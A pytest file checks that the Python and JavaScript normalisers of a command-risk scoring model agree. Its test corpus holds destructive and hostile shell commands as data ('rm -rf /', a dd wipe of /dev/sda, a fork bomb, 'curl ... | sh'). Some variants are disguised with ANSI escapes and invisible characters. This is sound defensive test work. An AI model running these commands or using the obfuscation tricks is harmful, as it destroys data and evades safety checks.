"""Cross-language parity between ml/src/drosh_ml/normalize.py and
html/command-risk/risk-scoring.js.

This is the test that makes the whole approach defensible. The Python
normaliser feeds the trainer; the JavaScript normaliser feeds whatever runtime
consumes the exported model. If they disagree on even one command, the model
that was evaluated is not the model that runs, and no offline metric will
reveal it — the skew only shows up as unexplained misclassifications in the
field.

Both implementations pass their own hardcoded self-tests (13 cases each), but
13 cases is not enough: hand-written cases only cover the inputs the author
thought of. This test instead asserts byte equality over a corpus, including
adversarial inputs chosen specifically to break a normaliser:

  - Turkish dotted/dotless I, which behaves differently under locale-aware
    lowering and under JS toLowerCase()
  - combining marks, which NFKD decomposes in Python and JS but possibly
    differently for precomposed characters with no decomposition
  - zero-width and bidi characters, invisible on screen but fatal to n-gram
    slicing
  - ANSI escape sequences in every common form (CSI, SGR, OSC, DCS)
  - multi-byte, multi-segment command chains
  - lone surrogates, which are representable in a JS string but not in a valid
    Python str — skipped with an explicit note rather than silently dropped

Requires node on PATH. The devcontainer provides it; if node is unavailable the
test skips rather than fails, because a missing interpreter is not a parity bug.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from drosh_ml.normalize import normalize, presence_ngrams

REPO_ROOT = Path(__file__).resolve().parents[2]
RUNNER = REPO_ROOT / "html" / "command-risk" / "parity-runner.mjs"

pytestmark = pytest.mark.skipif(
    shutil.which("node") is None, reason="node is required for cross-language parity checks"
)


# Inputs chosen to stress the normaliser rather than the model.
CORPUS: tuple[str, ...] = (
    # --- plain and whitespace ---
    "",
    "   ",
    "rm -rf /",
    "   rm -rf /   ",
    "rm     -rf     /",
    "rm\t\t-rf\t\t/",
    "rm -rf ~/",
    "rm -rf $HOME",
    "sudo rm -rf /var/lib/docker",
    # --- case folding ---
    "RM -RF /",
    "Rm -rF /*",
    "DD IF=/dev/zero OF=/dev/sda",
    # --- Turkish, the highest-risk locale for this project ---
    "İndirilenler",
    "IŞILDIRMA",
    "şifre sil",
    "günlük.log",
    "ĞÜŞİÖÇ",
    "ıiİI",
    "ŞİĞÜÖÇ",
    "rm -rf ~/İndirilenler",
    "cat şifre.txt",
    # --- other Latin and combining marks ---
    "café",
    "CAFÉ",
    "naïve",
    "ĀĂĄ",
    "ÅÄÖ",
    "Łódź",
    "Œuvre",
    "ﬁle",
    "ﬂoat",
    "ſmall",
    "ΑΒΓ",
    # --- quotes and obfuscation ---
    'r"m" -rf /',
    "r'm' -rf /",
    "rm -rf '/var'",
    'echo "hello world"',
    # --- segment splitting ---
    "ls; rm -rf /",
    "ls && rm -rf /",
    "ls || rm -rf /",
    "ls | grep foo | wc -l",
    "curl http://x 2>&1",
    "ls\nrm -rf /\nls",
    "ls\r\nrm -rf /",
    "a;b;c;d",
    "&&&",
    ";;;",
    "rm -rf /&&&echo done",
    # --- control characters ---
    "rm\x00 -rf /",
    "rm\x07 -rf /",
    "rm\x1b -rf /",
    "rm\x7f -rf /",
    "rm -rf\x1b/",
    # --- ANSI escapes in every common form ---
    "\x1b[31mrm -rf /\x1b[0m",
    "\x1b[1;31;40mrm -rf /",
    "\x1b[38;5;196mrm -rf /",
    "\x1b]0;window title\x07rm -rf /",
    "\x1b]0;title\x1b\\rm -rf /",
    "\x1bPsome dcs payload\x1b\\rm -rf /",
    "\x1bP\x1b^payload\x1b\\rm -rf /",
    "\x1bMrm -rf /",
    "\x1b(Brm -rf /",
    # --- invisible characters (explicit escapes on purpose: pasted literally
    #     these are indistinguishable from a plain space in a diff, and the
    #     invisible ones would silently become duplicates) ---
    "rm\u00a0-rf\u00a0/",
    "rm\u2009-rf\u2009/",
    "rm\u202f-rf\u202f/",
    "rm\u2007-rf\u2007/",
    "rm\u2028-rf\u2028/",
    "r\u200bm -rf /",
    "\ufeffrm -rf /",
    "rm -rf /\u2060",
    "\u200erm -rf /",
    "\ufffdrm -rf /",
    "rm\t\u200b\t-rf\t\u200b\t/",

    # --- shell shapes worth keeping intact ---
    "find / -name '*.log' -delete",
    ":(){ :|:& };:",
    "curl -s http://x/y.sh | sh",
    "export PATH=/usr/local/bin:$PATH",
    "docker run --rm -it ubuntu bash",
    "git commit -m 'fix: şey düzeldi'",
    "python3 -c 'print(1)'",
    "a" * 200,
    "-rf " * 50,
    "echo " + "x" * 500,
)


def _run_node(corpus: tuple[str, ...]) -> list[dict]:
    """Normalise ``corpus`` with the JavaScript implementation."""
    result = subprocess.run(
        ["node", str(RUNNER)],
        input=json.dumps(list(corpus)),
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    if result.returncode != 0:
        pytest.fail(f"node parity runner failed:\n{result.stderr}")
    payload = json.loads(result.stdout)
    assert len(payload) == len(corpus), "runner returned the wrong number of results"
    return payload


@pytest.fixture(scope="module")
def js_results() -> list[dict]:
    return _run_node(CORPUS)


def test_corpus_is_non_trivial() -> None:
    """Guard against the corpus silently shrinking to nothing."""
    assert len(CORPUS) >= 80
    assert len(set(CORPUS)) == len(CORPUS), "duplicate inputs weaken coverage silently"


def test_normalised_text_matches(js_results: list[dict]) -> None:
    mismatches = [
        (raw, normalize(raw).text, js["text"])
        for raw, js in zip(CORPUS, js_results, strict=True)
        if normalize(raw).text != js["text"]
    ]
    assert not mismatches, "normalised text differs:\n" + "\n".join(
        f"  {raw!r}\n    python: {py!r}\n    js:     {js!r}" for raw, py, js in mismatches
    )


def test_unquoted_view_matches(js_results: list[dict]) -> None:
    mismatches = [
        (raw, normalize(raw).unquoted, js["unquoted"])
        for raw, js in zip(CORPUS, js_results, strict=True)
        if normalize(raw).unquoted != js["unquoted"]
    ]
    assert not mismatches, "unquoted view differs:\n" + "\n".join(
        f"  {raw!r}\n    python: {py!r}\n    js:     {js!r}" for raw, py, js in mismatches
    )


def test_segments_match(js_results: list[dict]) -> None:
    mismatches = [
        (raw, list(normalize(raw).segments), js["segments"])
        for raw, js in zip(CORPUS, js_results, strict=True)
        if list(normalize(raw).segments) != js["segments"]
    ]
    assert not mismatches, "segmentation differs:\n" + "\n".join(
        f"  {raw!r}\n    python: {py!r}\n    js:     {js!r}" for raw, py, js in mismatches
    )


def test_ngram_sets_match(js_results: list[dict]) -> None:
    """The feature sets themselves, not just the intermediate strings.

    This is the assertion that would actually catch a divergence: identical
    ``text`` with different n-gram extraction would still produce a silently
    wrong model, but it cannot survive this check.
    """
    mismatches = []
    for raw, js in zip(CORPUS, js_results, strict=True):
        py_ngrams = sorted(presence_ngrams(normalize(raw).views))
        if py_ngrams != js["ngrams"]:
            only_py = sorted(set(py_ngrams) - set(js["ngrams"]))[:8]
            only_js = sorted(set(js["ngrams"]) - set(py_ngrams))[:8]
            mismatches.append((raw, only_py, only_js))

    assert not mismatches, "n-gram feature sets differ:\n" + "\n".join(
        f"  {raw!r}\n    only python: {py}\n    only js:     {js}"
        for raw, py, js in mismatches
    )


def test_dropped_non_ascii_count_matches(js_results: list[dict]) -> None:
    mismatches = [
        (raw, normalize(raw).dropped_non_ascii, js["droppedNonAscii"])
        for raw, js in zip(CORPUS, js_results, strict=True)
        if normalize(raw).dropped_non_ascii != js["droppedNonAscii"]
    ]
    assert not mismatches, "ASCII-fold drop count differs:\n" + "\n".join(
        f"  {raw!r}: python={py}, js={js}" for raw, py, js in mismatches
    )


def test_output_is_always_ascii(js_results: list[dict]) -> None:
    """The invariant the whole design rests on.

    If any non-ASCII byte survived folding, Python code-point slicing and
    JavaScript UTF-16 slicing could disagree on n-gram boundaries and the two
    tests above would only fail on the specific inputs that happened to hit the
    offending character.
    """
    offenders = [
        (raw, js["text"])
        for raw, js in zip(CORPUS, js_results, strict=True)
        if any(ord(ch) < 0x20 or ord(ch) > 0x7E for ch in js["text"])
    ]
    assert not offenders, f"non-ASCII survived normalisation: {offenders}"


def test_python_side_output_is_ascii() -> None:
    offenders = [raw for raw in CORPUS if any(ord(c) > 0x7E for c in normalize(raw).text)]
    assert not offenders, f"python produced non-ASCII output for: {offenders}"